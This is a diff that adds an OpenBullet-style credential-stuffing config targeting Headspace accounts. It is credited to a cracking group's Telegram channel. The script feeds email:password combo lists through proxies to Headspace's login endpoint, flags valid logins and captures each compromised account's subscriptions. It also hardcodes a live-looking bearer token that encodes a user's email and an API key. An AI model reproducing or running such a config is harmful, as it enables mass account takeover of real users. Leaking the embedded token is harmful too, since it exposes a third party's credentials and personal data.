@@ -1,0 +1,98 @@
+[SETTINGS]
+{
+  "Name": "headspace",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-26T23:10:34.7762119+02:00",
+  "AdditionalInfo": "https://t.me/crackforce",
+  "Author": "@CONFIG_COMBO",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://auth.headspace.com/co/authenticate" 
+  CONTENT "{\"client_id\":\"xkQY1I0RgfxPhCNtJZ70cd8oTzymDT1r\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"realm\":\"User-Password-Headspace\",\"credential_type\":\"http://auth0.com/oauth/grant-type/password-realm\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "auth0-client: eyJuYW1lIjoiYXV0aDAuanMiLCJ2ZXJzaW9uIjoiOS4xMy4yIn0=" 
+  HEADER "content-length: 208" 
+  HEADER "origin: https://www.headspace.com" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Wrong email or password" 
+    KEY "access_denied" 
+  KEYCHAIN Success OR 
+    KEY "login_ticket" 
+
+REQUEST GET "https://api.prod.headspace.com/subscription/v1/subscriptions?userId=HSUSER_PKKG6V2PGUM8ZTHAH" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik4wUkVRMFk0UXpjMk1FTkdOMEUxTVRGQ1JVWkVRa1pGUWpVNVJURkZRVFV4UVRBM05qZEJOZyJ9.eyJodHRwczovL2FwaS5wcm9kLmhlYWRzcGFjZS5jb20vY29ubmVjdGlvbiI6IlVTRVJfUEFTU1dPUkRfSEVBRFNQQUNFIiwiaHR0cHM6Ly9hcGkucHJvZC5oZWFkc3BhY2UuY29tL2hzUGxhdGZvcm0iOiJERVNLVE9QIiwiaHR0cHM6Ly9hcGkucHJvZC5oZWFkc3BhY2UuY29tL2hzSWQiOiJIU1VTRVJfUEtLRzZWMlBHVU04WlRIQUgiLCJodHRwczovL2FwaS5wcm9kLmhlYWRzcGFjZS5jb20vcHJvdmlkZXJJZCI6Im1vaGFtZWRlbGFsZnkyMzQ1QGdtYWlsLmNvbSIsImh0dHBzOi8vYXBpLnByb2QuaGVhZHNwYWNlLmNvbS92MkFwaUtleSI6IkZsMkQxNjRydDhpZE5VY0lyY3p0dHB6SUNKUXFMMzdKZUNpNHlQb3d3d1k9IiwiaHR0cHM6Ly9hcGkucHJvZC5oZWFkc3BhY2UuY29tL2V4dGVybmFsT3JnSWQiOm51bGwsImlzcyI6Imh0dHBzOi8vYXV0aC5oZWFkc3BhY2UuY29tLyIsInN1YiI6ImF1dGgwfDYyM2Y3Yzk1OWFhZTlkMDA3MGRjMTI1ZCIsImF1ZCI6WyJodHRwczovL2FwaS5wcm9kLmhlYWRzcGFjZS5jb20iLCJodHRwczovL2IyYy1wcm9kLWhlYWRzcGFjZS5hdXRoMC5jb20vdXNlcmluZm8iXSwiaWF0IjoxNjQ4MzI3ODMyLCJleHAiOjE2NDg0MTQyMzIsImF6cCI6InhrUVkxSTBSZ2Z4UGhDTnRKWjcwY2Q4b1R6eW1EVDFyIiwic2NvcGUiOiJvcGVuaWQgZW1haWwifQ.bPmuiMPl4qpsPQM8GaG4Ui3wgW4Mfpe6bOjDPR0wTWTOp2A1xXbpXZ4IJAuiA0OS8QQNgEX6O2F-mlJsxj1OLB6r8Od-e_4evPBf5D51kP4qbIkzOlu10sM877NmWyarM2vdgmvRqnAFMQSinpiGehHO573vJMyqerv2uSV8_bayy5DTEA6OeveM668TqscBkk3mEWgGJ-GqSSuoSmL-qMbKtMUdW4e73-jEz8wlSaobN3mbavUdK4rxEftWjzjND5v91a_KQxw9fx-q4ZmO_Wcrvn4PexrpHhFyMUfcQnhjjyDLhieOhZCp03THMthkwTbhIs2YBEU_aa5JNuLKuQ" 
+  HEADER "hs-languagepreference: en-US" 
+  HEADER "origin: https://my.headspace.com" 
+  HEADER "referer: https://my.headspace.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.82 Safari/537.36" 
+
+#subscriptions PARSE "<SOURCE>" JSON "subscriptions" CreateEmpty=FALSE -> CAP "subscriptions" 
+
+FUNCTION Constant "@CONFIG_COMBO" -> CAP "Config By" 
+
